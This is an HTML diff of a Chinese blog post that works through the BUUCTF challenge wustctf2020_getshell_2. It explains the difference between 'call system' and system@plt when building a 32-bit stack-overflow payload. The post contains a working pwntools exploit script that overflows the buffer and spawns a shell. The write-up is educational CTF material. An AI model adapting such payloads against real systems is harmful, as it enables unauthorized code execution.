@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="一道题说明call system 与system plt调用的区别  题目为：buuctf  wustctf2020_getshell_2 拿到题目，我们先checksec一下：  我们拖入IDA中：  非常明显的栈溢出，但是我们在构建payload的时候，发现了字节是不够的: 1payload &#x3D; b&quot;A&quot;*(0x18+0x4)  + p32(system_plt_addr)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一道题说明call system 与system plt调用的区别">
+<meta property="og:url" content="http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="一道题说明call system 与system plt调用的区别  题目为：buuctf  wustctf2020_getshell_2 拿到题目，我们先checksec一下：  我们拖入IDA中：  非常明显的栈溢出，但是我们在构建payload的时候，发现了字节是不够的: 1payload &#x3D; b&quot;A&quot;*(0x18+0x4)  + p32(system_plt_addr)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/1.png">
+<meta property="og:image" content="http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/2.png">
+<meta property="og:image" content="http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/3.png">
+<meta property="og:image" content="http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/7.png">
+<meta property="og:image" content="http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/5.png">
+<meta property="og:image" content="http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/6.png">
+<meta property="article:published_time" content="2024-06-15T15:01:53.000Z">
+<meta property="article:modified_time" content="2024-06-15T15:28:45.284Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="栈溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>一道题说明call system 与system plt调用的区别</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2024/07/28/ZJCTF-2019-NiZhuanSiWei/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2024/06/12/NewStarCTF-stack-migration/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&text=一道题说明call system 与system plt调用的区别"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&title=一道题说明call system 与system plt调用的区别"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&is_video=false&description=一道题说明call system 与system plt调用的区别"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一道题说明call system 与system plt调用的区别&body=Check out this article: http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&title=一道题说明call system 与system plt调用的区别"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&title=一道题说明call system 与system plt调用的区别"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&title=一道题说明call system 与system plt调用的区别"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&title=一道题说明call system 与system plt调用的区别"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&name=一道题说明call system 与system plt调用的区别&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&t=一道题说明call system 与system plt调用的区别"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">一道题说明call system 与system plt调用的区别</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        一道题说明call system 与system plt调用的区别
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-15T15:01:53.000Z" itemprop="datePublished">2024-06-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">一道题说明call system 与system plt调用的区别</h1>
+
+<p>题目为：buuctf  wustctf2020_getshell_2</p>
+<p>拿到题目，我们先checksec一下：</p>
+<p><img src="/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/1.png" alt="1"></p>
+<p>我们拖入IDA中：</p>
+<p><img src="/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/2.png" alt="2"></p>
+<p>非常明显的栈溢出，但是我们在构建payload的时候，发现了字节是不够的:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)  + p32(system_plt_addr) + p32(<span class="number">0</span>) + p32(sh_addr)</span><br></pre></td></tr></table></figure>
+
+<p>这样书写，是多了4个字节的，我们无法获取shell的，我们可以详细看看system_plt_addr干了什么：</p>
+<p><img src="/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/3.png" alt="3"></p>
+<p><img src="/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/7.png" alt="7"></p>
+<p>可以看到他是直接跳转到某个地址，然后开始执行system函数的，那莫p32(0)就不能缺少，但是题目中有shell函数，其中有一条命令是call system，如果用这个指令，就可以少发送4个字节：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)  + p32(call_system) + p32(sh_addr)</span><br></pre></td></tr></table></figure>
+
+<p>这是为啥呢？其实call 指令内含两条指令，一条是将下一条要执行的命令地址(rip)压入栈中，接下来再进行跳转到某个地址：</p>
+<p><img src="/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/5.png" alt="5"></p>
+<p>接下来会将0x804852e压入栈中，然后就会跳转：</p>
+<p><img src="/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/6.png" alt="6"></p>
+<p>此时相当于它自己造了一个p32(0)，也就能取到sh的地址并传入了，其实本质是符合了正常函数的调用流程，用plt表跳入省略了将返回地址压入栈这一步操作，所以需要我们构造返回地址，而call 就不需要了，因为call 是正常的函数调用。payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./wustctf2020_getshell_2&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;node5.buuoj.cn&quot;,26453)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./wustctf2020_getshell_2&quot;</span>)</span><br><span class="line">gdb.attach(sh,<span class="string">&quot;break *0x804859C&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#system_plt_addr = elf.plt[&quot;system&quot;]</span></span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x8048670</span></span><br><span class="line">call_system = <span class="number">0x8048529</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>) + p32(call_system) + p32(<span class="number">0x8048670</span>)</span><br><span class="line"><span class="comment">#payload = b&quot;A&quot;*(0x18+0x4)  + p32(system_plt_addr) + p32(0) + p32(sh_addr)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">一道题说明call system 与system plt调用的区别</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&text=一道题说明call system 与system plt调用的区别"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&title=一道题说明call system 与system plt调用的区别"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&is_video=false&description=一道题说明call system 与system plt调用的区别"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一道题说明call system 与system plt调用的区别&body=Check out this article: http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&title=一道题说明call system 与system plt调用的区别"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&title=一道题说明call system 与system plt调用的区别"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&title=一道题说明call system 与system plt调用的区别"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&title=一道题说明call system 与system plt调用的区别"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&name=一道题说明call system 与system plt调用的区别&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/&t=一道题说明call system 与system plt调用的区别"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
